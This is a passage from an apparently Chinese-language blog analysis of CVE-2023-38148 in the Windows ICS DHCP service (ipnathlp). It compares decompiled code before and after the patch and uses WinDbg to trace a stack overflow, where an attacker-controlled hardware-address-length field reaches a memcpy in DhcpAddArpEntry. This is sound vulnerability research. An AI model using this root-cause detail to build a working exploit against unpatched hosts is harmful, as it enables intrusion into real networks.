style="color:#a6e22e">WPP_SF_dD</span>(</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)v4<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>),</span></span><span style="display:flex;"><span><span style="color:#ae81ff">97</span>i64,</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids,</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">230</span>),</span></span><span style="display:flex;"><span><span style="color:#ae81ff">32</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_InterlockedIncrement</span>((<span style="color:#66d9ef">volatile</span><span style="color:#66d9ef">signed</span><span style="color:#66d9ef">__int32</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>DhcpStatistics);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DumpDhcpHeaderInfo</span>(a2);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 修复代码</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">void</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">DhcpProcessMessage</span>(<span style="color:#66d9ef">struct</span> _DHCP_INTERFACE<span style="color:#f92672">*</span>a1,<span style="color:#66d9ef">struct</span> _NH_BUFFER<span style="color:#f92672">*</span>a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset_0</span>(<span style="color:#f92672">&amp;</span>v11,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x40u</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DumpDhcpHeaderInfo</span>(a2);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">230</span>)<span style="color:#f92672">></span><span style="color:#ae81ff">0x20u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( WPP_GLOBAL_Control<span style="color:#f92672">!=</span> (CInterfaceMonitor<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">25</span>)<span style="color:#f92672">>=</span><span style="color:#ae81ff">4u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WPP_SF_dd</span>(</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>),</span></span><span style="display:flex;"><span><span style="color:#ae81ff">97</span>i64,</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>WPP_df007ca3347434f5610fc5a17e95e0a3_Traceguids,</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">230</span>),</span></span><span style="display:flex;"><span><span style="color:#ae81ff">32</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_10;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>LABEL_10:</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_InterlockedIncrement</span>((<span style="color:#66d9ef">volatile</span><span style="color:#66d9ef">signed</span><span style="color:#66d9ef">__int32</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>DhcpStatistics);<span style="color:#75715e">// 这里多了调用</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">goto</span> LABEL_11;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span>LABEL_11:</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EnterCriticalSection</span>(<span style="color:#f92672">&amp;</span>DhcpInterfaceLock);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)a1<span style="color:#f92672">+</span><span style="color:#ae81ff">19</span>)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LeaveCriticalSection</span>(<span style="color:#f92672">&amp;</span>DhcpInterfaceLock);</span></span></code></pre></div><p>略过的代码中，读取了a2参数的代码如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">DhcpExtractOptionsFromMessage</span>((<span style="color:#66d9ef">struct</span> _NH_BUFFER<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">228</span>),<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">55</span>),<span style="color:#f92672">&amp;</span>v11) )</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v12 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DhcpProcessBootpMessage</span>(a1, a2,<span style="color:#f92672">&amp;</span>v11);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_11;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">DhcpIsLocalHardwareAddress</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">256</span>,<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">230</span>)) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ....</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)(v12<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v7<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DhcpProcessDiscoverMessage</span>(a1, a2,<span style="color:#f92672">&amp;</span>v11);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_BYTE<span style="color:#f92672">*</span>)(v12<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">3</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DhcpProcessRequestMessage</span>(a1, a2,<span style="color:#f92672">&amp;</span>v11);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>DhcpArpForDad )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DhcpRemoveArpEntry</span>(v10);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DhcpCancelLease</span>(v10, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">256</span>,<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">230</span>));</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_BYTE<span style="color:#f92672">*</span>)(v12<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">7</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_BYTE<span style="color:#f92672">*</span>)(v12<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">8</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DhcpProcessInformMessage</span>(a1, a2,<span style="color:#f92672">&amp;</span>v11);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_11;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>DhcpArpForDad )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DhcpRemoveArpEntry</span>(<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">60</span>));</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DhcpCancelLease</span>(<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">60</span>), (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">256</span>,<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)a2<span style="color:#f92672">+</span><span style="color:#ae81ff">230</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>查看这些函数代码，在<code>DhcpProcessBootpMessage</code>函数中有如下逻辑</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">DhcpProcessBootpMessage</span>(</span></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)v3<span style="color:#f92672">+</span><span style="color:#ae81ff">228</span>;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>DhcpSendUnicastMessagesEnabled</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> v5[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#a6e22e">DhcpAddArpEntry</span>(v6, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)v5<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span>)v5[<span style="color:#ae81ff">2</span>], v23) )<span style="color:#75715e">// 这个函数触发了漏洞</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> {</span></span><span style="display:flex;"><span><span style="color:#75715e">// movzx r8d, byte ptr [r15+2] ; Size</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ...</span></span></code></pre></div><p>前面知道<code>a2 + 230</code>是长度字段，v5=v2+228，传入<code>DhcpAddArpEntry</code>的size参数为v5+2，也就是<code>a2 + 230</code>
在<code>DhcpAddArpEntry</code>函数中，Row为栈内结构体，memcpy传入的长度参数为<code>a2 + 230</code>，也就是补丁中判断的长度参数。
MIB_IPNET_ROW2结构体定义可以在<a href="https://learn.microsoft.com/en-us/windows/win32/api/netioapi/ns-netioapi-mib_ipnet_row2" target="_blank">这找到</a>，其大小为0x58</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">DhcpAddArpEntry</span>(DWORD a1,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>Src,<span style="color:#66d9ef">size_t</span> Size,<span style="color:#66d9ef">struct</span> _DHCP_INTERFACE<span style="color:#f92672">*</span>a4)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> MIB_IPNET_ROW2 Row;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)Size;</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset_0</span>(<span style="color:#f92672">&amp;</span>Row,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">sizeof</span>(Row));</span></span><span style="display:flex;"><span> Row.InterfaceIndex<span style="color:#f92672">=</span> DhcpAdapterIndex;</span></span><span style="display:flex;"><span> Row.Address.Ipv4.sin_family<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> Row.Address.Ipv4.sin_addr.S_un.S_addr<span style="color:#f92672">=</span> a1;</span></span><span style="display:flex;"><span> Row.PhysicalAddressLength<span style="color:#f92672">=</span> v4;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy_0</span>(Row.PhysicalAddress, Src, v4);</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v11;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>所以漏洞触发路径为<code>DhcpProcessMessage->DhcpProcessBootpMessage->DhcpAddArpEntry->memcpy_0</code>，当长度参数过长时可以利用memcpy触发栈溢出。</p><h4 id="动态调试">动态调试</h4><p>使用windbg附加到svchost进程，在<code>ipnathlp!DhcpProcessMessage</code>断点，而后触发DHCP请求，windbg在<code>ipnathlp!DhcpProcessMessage</code>断下
由于不知道<code>DhcpProcessMessage</code>的a2结构体定义，此处构造正常的DHCP请求，并在调试器中查看这个结构体成员信息。
单步运行到判断长度的地方，此时rsi指向传入的<code>_NH_BUFFER</code>结构体，</p><pre tabindex="0"><code>0:004> u
ipnathlp!DhcpProcessMessage+0x7f:
00007ff9`c00176f3 488dbee4000000 lea rdi,[rsi+0E4h]
00007ff9`c00176fa 41b604 mov r14b,4
00007ff9`c00176fd 807f0220 cmp byte ptr [rdi+2],20h
00007ff9`c0017701 7636 jbe ipnathlp!DhcpProcessMessage+0xc5 (00007ff9`c0017739)
00007ff9`c0017703 493bdc cmp rbx,r12
00007ff9`c0017706 742a je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732)
00007ff9`c0017708 44847b1c test byte ptr [rbx+1Ch],r15b
00007ff9`c001770c 7424 je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732)</code></pre><p>可以在调试器内看到<code>(_BYTE *)a2 + 230)</code>值为6</p><pre tabindex="0"><code>0:004> db rdi+2
00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a..........
00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B
00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</code></pre><p>而该处数据来源于DHCP客户端发送的DHCP请求，在wireshark中可以看到数据包中刚好有长度字段值为6，说明<code>(_BYTE *)a2 + 230)</code>处有可能是数据包内的<code>Hardware address length</code>。</p><p><img alt="" src="/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915104424.png"/></p><p>此时调用栈：</p><pre tabindex="0"><code>0:004> k
Child-SP RetAddr Call Site
0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x86
0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644
0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f
0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca
0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456
0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14
0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21</code></pre><p>此时尝试手动将<code>(_BYTE *)a2 + 230)</code>修改为0xfe，继续运行，但没有触发异常。</p><pre tabindex="0"><code>0:004> db rdi+2
00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a..........
00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B
00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:004> eb rdi+2 fe
0:004> db rdi+2
00000203`faa1fdb6 fe 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a..........
00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B
00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:002> g
Breakpoint 0 hit
ipnathlp!DhcpProcessMessage:
00007ff9`c0017674 48895c2418 mov qword ptr [rsp+18h],rbx ss:0000000e`346ff630=00000203faa7e350</code></pre><p>改为单步调试，再次发起DHCP请求，发现没有进入到漏洞函数<code>DhcpProcessBootpMessage</code>中，原因是v13不为0，条件不成立，不会调用<code>DhcpProcessBootpMessage</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v13 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( WPP_GLOBAL_Control<span style="color:#f92672">!=</span> (CInterfaceMonitor<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">25</span>)<span style="color:#f92672">>=</span><span style="color:#ae81ff">4u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WPP_SF_</span>(<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>),<span style="color:#ae81ff">98</span>i64,<span style="color:#f92672">&amp;</span>WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DhcpProcessBootpMessage</span>(a1, a2,<span style="color:#f92672">&amp;</span>v12);<span style="color:#75715e">// 这里触发漏洞</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">goto</span> LABEL_25;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>对v13下写断点</p><pre tabindex="0"><code>0:004> ba w1 rsp+0x38
0:004> g
Breakpoint 6 hit
msvcrt!memset+0x35:
00007ff9`ed1046b5 4983e908 sub r9,8</code></pre><p>触发断点，此时调用栈如下，对应代码为<code>memset_0(a3, 0, 0x40ui64);</code></p><pre tabindex="0"><code>0:004> k
Child-SP RetAddr Call Site
0000000e`3487f418 00007ff9`c0015b63 msvcrt!memset+0x35
0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x7b
0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0
0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644
0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f
0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca
0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456
0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14
0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21</code></pre><p>此处将目标内存清零，不符合前面说的条件，继续运行，再次触发写断，调用栈为</p><pre tabindex="0"><code>0:004> k
Child-SP RetAddr Call Site
0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x428
0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0
0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644
0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f
0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca
0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456
0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14
0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21</code></pre><p>对应在<code>DhcpExtractOptionsFromMessage</code>的代码如下，当OptionID为0x35时进入case语句内</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v9<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _DHCP_OPTION<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)a1<span style="color:#f92672">+</span><span style="color:#ae81ff">240</span>);</span></span><span style="display:flex;"><span>OptionID<span style="color:#f92672">=</span> v9<span style="color:#f92672">-></span>OptionID;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( OptionID )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span> ( OptionID )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span><span style="color:#ae81ff">0x35u</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v6<span style="color:#f92672">!=</span> (CInterfaceMonitor<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)v6<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)v6<span style="color:#f92672">+</span><span style="color:#ae81ff">25</span>)<span style="color:#f92672">>=</span><span style="color:#ae81ff">4u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WPP_SF_</span>(<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)v6<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>),<span style="color:#ae81ff">44</span>i64,<span style="color:#f92672">&amp;</span>WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids);</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> WPP_GLOBAL_Control;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">BYTE1</span>(v9<span style="color:#f92672">-></span>OptionID) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> a3[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span> v9;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><code>_DHCP_OPTION</code>结构体定义如下，对应于DHCP请求内的option</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> DWORD DHCP_OPTION_ID;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _DHCP_OPTION</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> DHCP_OPTION_ID OptionID;</span></span><span style="display:flex;"><span> LPWSTR OptionName;</span></span><span style="display:flex;"><span> LPWSTR OptionComment;</span></span><span style="display:flex;"><span> DHCP_OPTION_DATA DefaultValue;</span></span><span style="display:flex;"><span> DHCP_OPTION_TYPE OptionType;</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#f92672">></span> db rdi</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000203</span><span style="color:#960050;background-color:#1e0010">`</span>faa1fea4<span style="color:#ae81ff">35</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">07</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">0</span>c<span style="color:#f92672">-</span><span style="color:#ae81ff">29</span> c2<span 